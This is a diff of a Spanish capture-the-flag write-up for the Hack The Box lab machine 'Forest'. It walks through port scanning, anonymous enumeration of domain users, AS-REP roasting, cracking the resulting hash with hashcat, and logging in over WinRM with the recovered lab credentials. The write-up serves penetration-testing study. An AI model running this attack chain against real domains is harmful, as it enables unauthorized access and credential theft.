@@ -3,20 +3,24 @@ Dificultad: Easy
 
 
 ``sudo nmap 10.10.10.161 -sS -p- --open --min-rate 5000 -n -Pn -oG allPorts``
+
 ![Pasted image 20250313124032](https://github.com/user-attachments/assets/cce45e1d-40db-41e1-8c41-31f49d98e1b7)
 
 
 ``nmap 10.10.10.161 -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703 -oN target``
+
 ![Pasted image 20250313124107](https://github.com/user-attachments/assets/24248001-b40c-41af-8833-7fe81a49fb73)
 
 domain: htb.local
 
 Vamos a ver un poco más del DC:
 ``netexec smb 10.10.10.161``
+
 ![Pasted image 20250313124206](https://github.com/user-attachments/assets/a171a0fe-eadb-4794-b73e-f08fe7ad8bed)
 
 
 La máquina se llama FOREST. Y confirmamos que el dominio es htb.local
+
 -> /etc/hosts
 ![Pasted image 20250313124246](https://github.com/user-attachments/assets/808e346e-b59b-469b-bc41-74a39863a464)
 
@@ -33,12 +37,14 @@ Para guardarnos este listado de usuarios y después hacer el correspondiente tra
 ``rpcclient -U '' 10.10.10.161 -N -c 'enumdomusers' > users.txt``
 
 Si miramos el contenido de users.txt, es exactamente lo mismo que el output que vimos anteriormente:
+
 ![Pasted image 20250313124641](https://github.com/user-attachments/assets/a4943d5f-f491-47e0-a0e4-004033203c96)
 
 
 Vamos a hacer un tratamiento a los datos para quedarnos sólo con lo que está entre los corchetes:
 
 ``cat users.txt | cut -d '[' -f2 | cut -d ']' -f1 > realusers.txt``
+
 ![Pasted image 20250313124825](https://github.com/user-attachments/assets/1d620372-a277-4da3-885a-d611c20c18ef)
 
 
@@ -48,6 +54,7 @@ Con este listado de usuarios, y aunque no tengamos sus contraeñas, podemos, por
 ``impacket-GetNPUsers -no-pass -usersfile realusers.txt htb.local/ -output hashes.asreproast ``
 
 -> Bingo.
+
 ![Pasted image 20250313125028](https://github.com/user-attachments/assets/d2280ce8-d54e-48c7-8da0-d86470d4c5bc)
 
 
@@ -56,12 +63,14 @@ Como hemos redirigido el output a hashes.asreproast, no hace falta que nos copie
 Vamos a utilizar hashcat para romper este hash. Primero, vamos a averiguar el código de identificación de este tipo de hash (``krb5asrep$23$``) para hashcat:
 
 ``hashcat --help | grep -i "kerberos"``
+
 ![Pasted image 20250313125209](https://github.com/user-attachments/assets/860c0728-affe-4957-ba93-2a035d275079)
 
 
 Una vez sabemos el código de identificación, tiramos hashcat con rockyou.
 
 ``hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force ``
+
 ![Pasted image 20250313125311](https://github.com/user-attachments/assets/2edaa5b0-c00a-480b-9fee-54b11f98b717)
 
 
@@ -69,21 +78,25 @@ svc-alfresco:s3rvice
 
 Vamos a validar las credenciales:
 ``netexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'``
+
 ![Pasted image 20250313125410](https://github.com/user-attachments/assets/128cd2ac-ff87-4b95-9049-cf613249ad34)
 
 
 Son credenciales válidas. Vamos a comprobar si permite winrm.
+
 ![Pasted image 20250313125504](https://github.com/user-attachments/assets/2d8ae864-fc25-4152-8595-1cc9c52a1144)
 
 Pwn3d!, por lo que podemos conectarnos vía winRM.
 
 ``evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'``
+
 ![Pasted image 20250313125644](https://github.com/user-attachments/assets/47f4700b-7614-4d4b-bbc9-df7850c80efb)
 
 
 Estamos dentro de la máquina víctima con el usuario svc-alfresco.
 
 En C:\Users\svc-alfresco\Desktop encontramos la flag de usuario:
+
 ![Pasted image 20250313125828](https://github.com/user-attachments/assets/a26fde34-e3c4-485a-9b36-1956ec5ff78d)
 
 
